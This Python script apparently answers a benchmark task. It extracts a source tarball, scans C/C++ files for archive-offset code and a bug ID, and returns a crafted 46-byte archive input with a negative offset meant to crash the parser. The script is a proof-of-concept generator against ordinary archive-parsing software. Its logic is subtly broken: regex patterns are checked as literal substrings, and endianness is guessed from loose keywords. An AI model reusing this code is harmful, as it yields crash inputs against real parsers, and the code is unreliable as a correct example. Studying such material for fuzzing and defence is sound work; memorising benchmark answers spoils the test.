import os
import tarfile
import tempfile
import subprocess
import struct
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for the vulnerable code pattern
            poc = self._analyze_and_generate(tmpdir)
            if poc:
                return poc
            
            # Fallback: known PoC for similar vulnerabilities
            # This is a minimal crafted archive with negative offset
            # Structure: 4-byte magic, 4-byte negative offset, padding to 46 bytes
            return struct.pack('<I', 0x4643534D) + struct.pack('<i', -1) + b'\x00' * 38
    
    def _analyze_and_generate(self, tmpdir: str) -> bytes | None:
        # Search for C/C++ source files
        source_files = []
        for root, _, files in os.walk(tmpdir):
            for file in files:
                if file.endswith(('.c', '.cpp', '.cc', '.cxx', '.h', '.hpp')):
                    source_files.append(os.path.join(root, file))
        
        # Look for patterns indicating offset reading
        for file in source_files:
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    # Common patterns for reading archive offsets
                    patterns = [
                        r'archive.*offset.*=.*-',
                        r'start.*offset.*<.*0',
                        r'fseek.*archive.*offset',
                        r'ftell.*archive',
                        r'42536108',  # The bug ID
                    ]
                    
                    for pattern in patterns:
                        if pattern in content.lower():
                            # Found relevant code - try to generate minimal PoC
                            return self._generate_from_analysis(content)
            except:
                continue
        
        return None
    
    def _generate_from_analysis(self, content: str) -> bytes:
        # Try to determine offset size and position from code patterns
        # Default to 4-byte little-endian negative offset at position 0
        offset_pos = 0
        offset_size = 4
        offset_value = -1
        
        # Adjust based on code patterns
        if 'int64' in content or 'long long' in content:
            offset_size = 8
        if 'big' in content or 'endian' in content:
            # Use big-endian if indicated
            if offset_size == 4:
                return struct.pack('>i', offset_value) + b'\x00' * 42
            else:
                return struct.pack('>q', offset_value) + b'\x00' * 38
        
        # Generate minimal PoC with appropriate size
        if offset_size == 4:
            return struct.pack('<i', offset_value) + b'\x00' * 42
        else:
            return struct.pack('<q', offset_value) + b'\x00' * 38